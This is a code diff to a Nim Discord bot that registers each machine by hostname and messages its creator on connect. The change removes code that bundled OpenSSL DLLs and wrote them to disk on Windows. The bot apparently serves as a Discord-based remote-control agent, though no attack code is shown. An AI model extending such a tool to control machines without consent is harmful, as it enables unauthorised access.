@@ -3,10 +3,6 @@ import dimscord, asyncdispatch, times, options, httpclient, osproc, os, strutils
 const
   discordToken = ""
   creatorId = ""
-  cyrptoDllData = staticRead("../DLL/libcrypto-1_1-x64.dll")
-  sslDllData = staticRead("../DLL/libssl-1_1-x64.dll")
-  cyrptoDllName = "libcrypto-1_1-x64.dll"
-  sslDllName = "libssl-1_1-x64.dll"
 let discord = newDiscordClient(discordToken)
 
 var
@@ -212,13 +208,6 @@ proc getHostname(): string =
 var machineName = getEnv("MACHINE_NAME", getHostname())
 
 proc onReady(s: Shard, r: Ready) {.event(discord).} =
-  when defined(windows):
-    if not fileExists(cyrptoDllName):
-        writeFile(cyrptoDllName, cyrptoDllData)
-    if not fileExists(sslDllName):
-        writeFile(sslDllName, sslDllData)
-
-    
   let dm = await discord.api.createUserDm(creatorId)
   if machineName notin sessionRegistry:
     sessionRegistry.add(machineName)
